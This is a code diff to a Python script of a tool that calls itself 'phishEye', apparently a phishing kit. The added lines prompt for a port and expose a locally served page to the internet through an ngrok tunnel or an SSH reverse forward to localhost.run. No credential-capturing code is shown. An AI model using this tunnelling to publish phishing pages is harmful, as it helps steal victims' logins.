@@ -1,7 +1,7 @@
 import sys, socket
 import subprocess
 import pkg_resources
-
+import getpass
 
 def is_connected():
     try:
@@ -39,7 +39,7 @@ else:
 
 try:
     import os, shutil, argparse, sys, itertools
-
+    from multiprocessing import Process
     sys.path.append("./server/")
     from banner import *
 
@@ -149,6 +149,39 @@ try:
                 _port = int(input("\n\nPlease enter port number (default = 4444): "))
                 if _port is not None:
                     port = _port
+            except KeyboardInterrupt:
+                sys.exit("\n\nThanks to try my phishEye.\nByeeeeeee......")
+            except:
+                pass
+
+
+            def ngrok_auth():
+                if os.name == 'posix':
+                    return os.path.isfile('/home/'+getpass.getuser()+'/.ngrok2/ngrok.yml')
+                else:
+                    return os.path.isfile('C:\\Users\\'+getpass.getuser()+'\\.ngrok2\\ngrok.yml')
+
+            # Choosing tunnel option
+            try:
+                tunnel = int(input("\n\nPlease any tunnel service: \n[1] Ngrok\n[2] Localhost.run\n\nEnter here: "))
+                if tunnel == 1:
+                    os.remove("./localhost.run")
+                    if not (ngrok_auth()):
+                        token = input("Enter your auth-token: ")
+                        if token:
+                            ngrok.set_auth_token(token)
+                        else:
+                            sys.exit("\nEnter your ngrok auth-token")   
+                elif tunnel == 2:
+                    def l_run():
+                        cmd = os.popen(f'ssh -o StrictHostKeyChecking=accept-new -o LogLevel=error -R 80:localhost:{port} nokey@localhost.run').readline   
+                        for line in iter(cmd, ''):  
+                            with open("localhost.run","a") as f:
+                                f.write(line)
+                    Process(target=l_run).start()
+                              
+                else:
+                    sys.exit("\nPlease choose a valid number.")        
             except KeyboardInterrupt:
                 sys.exit("\n\nThanks to try my phishEye.\nByeeeeeee......")
             except:
